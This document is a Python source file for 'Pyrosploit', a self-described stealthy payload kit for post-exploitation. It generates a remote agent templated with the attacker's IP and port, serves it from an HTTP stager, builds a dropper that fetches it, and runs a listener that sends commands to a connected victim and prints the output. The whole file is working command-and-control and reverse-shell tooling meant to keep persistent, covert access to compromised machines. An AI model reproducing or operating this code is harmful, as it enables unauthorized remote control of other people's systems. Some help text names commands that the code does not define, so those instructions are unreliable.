#!/usr/bin/python3
import os
import socket
import pyterpreter
from termcolor import colored


def pyrosploit_help():
    print('''
Welcome to Pyrosploit!!!
This is a stealthy payload generation and handling kit
the main intended use case is to use it after you have gained Code Execution on a machine
you can then use this to set up stealthy and persistent shells with some meterpreter like goodies (not many don't get your hopes up)

below is a list of commands using the commands is as simple as typing the command, if you want more information on the command please type command help
generally speaking the order you should execute in is:
 1. attacker_setup
 2. target_setup (if needed, most the time you can skip this)
 3. handler_setup
 4. stager_setup
 5. pyterpreter_generate
 6. stager_start
 7. handler_start
and at this point you should be trying to get a connection back!

good hunting!!

''')
    for i in commands:
        print(i.name)
commands = []

class machine:
    def __init__(self, ip, name):
        self.ip = ip
        self.public = False
        self.name = name


class server:
    def __init__(self, ip, port, protocol):
        self.ip = ip
        self.port = port
        self.protocol = protocol
    def start(self):
        if self.protocol == 'http':
            os.system("python -m http.server {} --bind {} --directory ./stager &".format(self.port, self.ip))
            self.pid = os.popen('ps | grep python').read()
            self.pid = self.pid.split('\n')
            self.pid = self.pid[-2]
            self.pid = self.pid.split(' ')[2]
            self.address = 'http://{}:{}'.format(self.ip, self.port)
            
        elif self.protocol == 'handler':
            buffer_size = 10240
            s = socket.socket()
            s.bind((self.ip, int(self.port)))
            s.listen(5)
            try:
                print(colored("Listing on {}:{}...".format(self.ip, self.port), 'green'))
                client_socket, client_address = s.accept()
                print(colored("Connection established Client - {}:{}".format(client_address[0], client_address[1]), "green"))
                banner = client_socket.recv(buffer_size).decode()
                print(banner)
                while True:
                    command = input('$>')
                    client_socket.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    results = client_socket.recv(buffer_size).decode()
                    print(results)
                client_socket.close()
                s.close()
            except:
                print("\n")
                print(colored("hanlder shutdown", "red"))
                pass
    def stop(self):
        if self.protocol == 'http':
            os.system("kill {}".format(self.pid))
        else:
            print("no stop function defined yet!")


class payload:
    def __init__(self, payload, template, parameters):
        self.name = payload
        self.template = template
        self.parameters = parameters
        self.payload = payload
    
    def generate(self):
        output = self.payload.format(self.parameters)
        with open("./output/{}".format(self.payload), 'w') as f:
            f.write(output)


class command:
    def __init__(self, help, name, function, needs):
        self.help_text = help
        self.name = name
        self.function = function
        self.needs = needs
        commands.append(self)
    def get_args(self):
        if self.needs != False:
            self.args = []
            for arg in self.needs:
                retarg = input("{}? $> ".format(arg))
                self.args.append(retarg)
        else:
            return
    def help(self):
        print(self.help_text)
    
    def run(self):
        if self.needs!= False:
            self.get_args()
            self.function(self.args)
        else:
            self.function()

############################################# Base Commands ##############################################

############################################# handler commands ##############################################

############################################## handler setup ################################################
handler_setup_help = '''
This is a command to set up the pyterpreter handler server
it will prompt you for everything you need.
'''
def handler_set_run():
    port = input("port for handler? $> ")
    global handler_server
    handler_server = server(attacker.ip, port, 'handler')

handler_setup = command(handler_setup_help, 'handler_setup', handler_set_run, False)
############################################# handler run ######################################################
handler_run_help = '''
This requires a handler_server object be present.
'''
def handler_run_function():
    handler_server.start()

handler_run = command(handler_run_help, 'handler_run', handler_run_function, False)
##############################################################################################################

############################################### Stager Commands ##############################################

############################################### stager_setup #################################################
stager_setup_help = '''
This command gathers information needed for the stager server
This command requires no args, and will prompt for what it needs
'''
def stager_setup_function():
    port = input("port? $> ")
    global stager
    stager = server(attacker.ip, port, 'http')

stager_setup = command(stager_setup_help, 'stager_setup', stager_setup_function, False)

############################################# stager_run ####################################################
stager_run_help = '''
This command runs the stager, this assumes you've already run stager_setup
This command requires no args.
'''
def stager_run_function():
    stager.start()
stager_run = command(stager_run_help, 'stager_run', stager_run_function, False)

############################################## stager_stop ###################################################
stager_stop_help = '''
This command stops the stager, this assumes you've already run stager_setup, and Stager_run
'''
def stager_stop_function():
    stager.stop()
stager_stop = command(stager_stop_help, 'stager_stop', stager_stop_function, False)
###############################################################################################################

############################################## Pyterpreter commands ##########################################

############################################## pyterpreter_generate #############################################
pyterpreter_generate_help = '''
This command generates the pyterpeter file for you to use
This command does not require any args.
'''
def pyterpreter_generate_function():
    if attacker.public == False:
        format_pyterpreter(attacker, handler_server)
    elif attacker.public == True:
        format_pyterpreter(public_machine, handler_server)
pyterpreter_generate = command(pyterpreter_generate_help, 'pyterpreter_generate', pyterpreter_generate_function, False)

def get_attacker_info():
    os.system('ifconfig')
    ip = input("ip of interface to use? $>")
    attacker = machine(ip, 'attacker')
    return attacker

def get_target_info():
    ip = input("ip address of the target?")
    target = machine(ip, 'target')
    return target

def get_server_info(attacker, protocol):
    port = input("port for server? $> ")
    return server(attacker.ip, port, protocol)


def format_pyterpreter(attacker, listener):
    with open('./pyterpreter/pyterpreter.py', 'r') as f:
        output = []
        for line in f:
            if "$IP" in line:
                line = line.split("$IP")
                line = attacker.ip.join(line)
                output.append(line)
            elif "$PORT" in line:
                line = line.split("$PORT")
                line = listener.port.join(line)
                output.append(line)
            output.append(line)
        with open("stager/pyterpreter.py", 'w') as x:
            output = '\n'.join(output)
            x.write(output)

def format_pytruder(format, server):
    url = "{}/pyterpreter.py".format(server.address)
    if format == 'sh':
        pytruder = './pytruder/pytruder.sh'
    elif format == 'py':
        pytruder = './pytruder/pytruder.py'
    else:
        print("error: unknown pytruder format")
        return
    with open(pytruder, 'r') as f:
        output = []
        for line in f:
            if '$URL' in line:
                line = line.split('$URL')
                line = url.join(line)
                output.append(line)
            output.append(line)
        with open('pytruder.{}'.format(format), 'w') as x:
            output = '\n'.join(output)
            x.write(output)


'''def command_line():
    command = input('$>')
    if command in'''


def main():
    global attacker
    attacker = get_attacker_info()
    global target
    target = get_target_info()
    print('''
    1. Normal
    2. Portfowarded
    ''')
    connection_type = input("connection type selection? $> ")
    if connection_type == '2':
        public_ip = input('public IP address for connecting back? $>')
        attacker.public = True
        global public_machine
        public_machine = machine(public_ip, 'public')
    while True:
        com = input('$> ').split(' ')
        if com[0] == 'help':
            pyrosploit_help()
        elif com[0] == 'exit':
            break
        else:
            success = False
            for i in commands:
                if i.name == com[0]:
                    if len(com) == 2:
                        if com[1] == 'help':
                            i.help()
                            success = True
                        else:
                            print(colored('error, unknown argument', 'red'))
                    elif len(com) == 1:
                        i.run()
                        success = True
            if success == False:
                print(colored('error, unknown command', 'red'))
                
    try:
        stager.stop()
    except:
        pass
    print(colored("thank you for using Pyrosploit", "green"))

                
            
        







if __name__ == '__main__':
    main()

